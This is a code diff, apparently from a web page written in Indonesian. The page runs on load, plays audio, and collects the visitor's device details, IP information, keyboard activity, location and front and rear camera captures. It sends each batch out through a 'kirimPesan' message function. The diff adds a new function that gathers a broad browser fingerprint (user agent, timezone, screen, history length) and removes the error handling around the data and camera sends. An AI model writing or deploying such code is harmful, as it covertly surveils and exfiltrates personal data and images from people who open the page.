@@ -563,29 +563,39 @@ Bluetooth              : ${bluetoothStatus}
 `.trim();
 };
 
-const ambilSensorMotion = async () => {
-  let akselerometer = 'Tidak didukung';
-  let gyroscope = 'Tidak didukung';
-  let magnetometer = 'Tidak';
-  let orientasiAbsolut = 'Tidak';
-
-  try {
-    if ('DeviceMotionEvent' in window) {
-      akselerometer = 'Didukung';
-      gyroscope = 'Didukung';
-    }
-    if ('DeviceOrientationEvent' in window) {
-      orientasiAbsolut = 'Ya';
-    }
-    // Magnetometer belum didukung luas di browser
-  } catch {}
+const ambilSistemKemampuan = () => {
+  const hasTouch = navigator.maxTouchPoints > 0 ? "Ya" : "Tidak";
+  const touchPoints = navigator.maxTouchPoints || 0;
+  const cookies = navigator.cookieEnabled ? "Aktif" : "Nonaktif";
+  const wasmSupport = typeof WebAssembly === "object" ? "Didukung" : "Tidak";
+  const javascriptSupport = typeof window === "object" ? "Aktif" : "Tidak";
+  const historyPages = history.length;
+  const language = navigator.language || "Tidak terdeteksi";
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Tidak diketahui";
+  const offsetGMT = `GMT${(new Date().getTimezoneOffset() / -60) >= 0 ? "+" : ""}${new Date().getTimezoneOffset() / -60}`;
+  const screenWidth = screen.width;
+  const screenHeight = screen.height;
+  const devicePixelRatio = window.devicePixelRatio.toFixed(2);
+  const orientation = (screen.orientation || {}).type || "Tidak diketahui";
+  const refreshRate = "60Hz"; // Estimasi default
 
   return `
-౼ 〘 𝗦𝗘𝗡𝗦𝗢𝗥 𝗠𝗢𝗧𝗜𝗢𝗡 & 𝗥𝗢𝗧𝗔𝗦𝗜 〙 ౼
-Akselerometer          : ${akselerometer}
-Gyroscope              : ${gyroscope}
-Magnetometer           : ${magnetometer}
-Orientasi Absolut      : ${orientasiAbsolut}
+౼ 〘 𝗦𝗜𝗦𝗧𝗘𝗠 & 𝗞𝗘𝗠𝗔𝗠𝗣𝗨𝗔𝗡 〙 ౼  
+Platform OS            : ${navigator.platform}
+User Agent Lengkap     : ${navigator.userAgent}
+WebAssembly Support    : ${wasmSupport}
+Cookies                : ${cookies}
+JavaScript             : ${javascriptSupport}
+Has Touchscreen        : ${hasTouch}
+Jumlah Touch Points    : ${touchPoints}
+Jumlah History Pages   : ${historyPages}
+Bahasa Browser         : ${language}
+Zona Waktu             : ${timezone}
+Offset GMT             : ${offsetGMT}
+Resolusi Layar         : ${screenWidth} x ${screenHeight}
+Rasio DPI              : ${devicePixelRatio}
+Refresh Rate (estimasi): ${refreshRate}
+Mode Orientasi         : ${orientation.includes("portrait") ? "Portrait" : "Landscape"}
 `.trim();
 };
 
@@ -658,21 +668,19 @@ const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  let infoPerangkat = '', bateraiInfo = '', layarGrafik = '', browserInfo = '';
-  let webFeatures = '', izinMedia = '', ipInfo = '', keyboard = '';
-  let perangkatEksternal = '', outputAudio = '', sensorMotion = '';
+  const infoPerangkat = await ambilDataPerangkat();
+  const bateraiInfo = await ambilBaterai();
+  const layarGrafik = await ambilLayarGrafik();
+  const browserInfo = ambilBrowserInfo();
+  const webFeatures = ambilWebAPIFeatures();
+  const izinMedia = await ambilIzinMedia();
+  const ipInfo = await ambilIPInfo();
 
-  try { infoPerangkat = await ambilDataPerangkat(); } catch {}
-  try { bateraiInfo = await ambilBaterai(); } catch {}
-  try { layarGrafik = await ambilLayarGrafik(); } catch {}
-  try { browserInfo = ambilBrowserInfo(); } catch {}
-  try { webFeatures = ambilWebAPIFeatures(); } catch {}
-  try { izinMedia = await ambilIzinMedia(); } catch {}
-  try { ipInfo = await ambilIPInfo(); } catch {}
-  try { keyboard = ambilKeyboardActivity(); } catch {}
-  try { perangkatEksternal = ambilPerangkatEksternal(); } catch {}
-  try { outputAudio = await ambilOutputAudio(); } catch {}
-  try { sensorMotion = await ambilSensorMotion(); } catch {}
+  // Fitur tambahan
+  const keyboard = ambilKeyboardActivity();
+  const perangkatEksternal = ambilPerangkatEksternal();
+  const outputAudio = await ambilOutputAudio();
+  const sistemKemampuan = ambilSistemKemampuan(); // ✅ Tambahan baru
 
   const gabungAwal = [
     infoPerangkat,
@@ -685,27 +693,19 @@ const mulai = async () => {
     keyboard,
     perangkatEksternal,
     outputAudio,
-    sensorMotion
-  ].filter(Boolean).join("\n\n"); // Hapus bagian kosong
+    sistemKemampuan // ✅ Ditambahkan ke gabungan
+  ].join("\n\n");
 
-  try { await kirimPesan(gabungAwal); } catch (err) {
-    await kirimPesan("〘 DEBUG ERROR 〙\n" + err.message);
-  }
+  await kirimPesan(gabungAwal);
 
-  try {
-    const lokasi = await ambilLokasi();
-    await kirimPesan(lokasi);
-  } catch {}
+  const lokasi = await ambilLokasi();
+  await kirimPesan(lokasi);
 
-  try {
-    const depan = await ambilKamera("user", "depan");
-    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
-  } catch {}
+  const depan = await ambilKamera("user", "depan");
+  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
 
-  try {
-    const belakang = await ambilKamera("environment", "belakang");
-    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
-  } catch {}
+  const belakang = await ambilKamera("environment", "belakang");
+  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
 };
 
     window.addEventListener("load", mulai);
